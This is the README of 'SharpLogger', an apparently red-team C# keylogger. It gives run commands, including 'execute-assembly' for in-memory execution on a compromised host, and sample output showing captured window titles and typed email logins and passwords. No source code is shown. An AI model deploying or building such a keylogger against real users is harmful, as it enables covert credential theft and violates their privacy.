# SharpLogger

## Description

Simple C# project to log keystrokes to both console and a temp file.

## Usage

`.\Keylogger.exe`

`execute-assembly Keylogger.exe`

## Example Output

```
User    : REDACTED\Username
Window  : Task Switching
Time    : 2018-12-17 05:47:20 PM
LogFile : C:\Users\Username\AppData\Local\Temp\e556dd02-d1e4-4200-8102-e73fc447c9dc.log
----------------------------------------------

<Tab>

User    : REDACTED\Username
Window  : New Tab - Google Chrome
Time    : 2018-12-17 05:47:21 PM
LogFile : C:\Users\Username\AppData\Local\Temp\e556dd02-d1e4-4200-8102-e73fc447c9dc.log
----------------------------------------------

gmail.com<Enter>

User    : REDACTED\Username
Window  : Gmail - Google Chrome
Time    : 2018-12-17 05:47:26 PM
LogFile : C:\Users\Username\AppData\Local\Temp\e556dd02-d1e4-4200-8102-e73fc447c9dc.log
----------------------------------------------

test@gmail.com<Enter><Ctrl>arealemail<Ctrl>@gmail.com<Enter>MySup3rSecretP@$$w0rd!<Enter><Ctrl><Ctrl><Ctrl><Ctrl><Ctrl><Ctrl><Ctrl><Ctrl><Ctrl><Ctrl><Ctrl><Ctrl><Ctrl><Ctrl><Ctrl><Ctrl><Ctrl><Ctrl>t

User    : REDACTED\Username
Window  : New Tab - Google Chrome
Time    : 2018-12-17 05:47:48 PM
LogFile : C:\Users\Username\AppData\Local\Temp\e556dd02-d1e4-4200-8102-e73fc447c9dc.log
----------------------------------------------

protonmail.com<Enter>

User    : REDACTED\Username
Window  : Login | ProtonMail - Google Chrome
Time    : 2018-12-17 05:48:06 PM
LogFile : C:\Users\Username\AppData\Local\Temp\e556dd02-d1e4-4200-8102-e73fc447c9dc.log
----------------------------------------------

testuser@protonmail.com<Tab>testpassword<Enter><Alt><Tab>
```

## TODO

Clipboard monitoring.
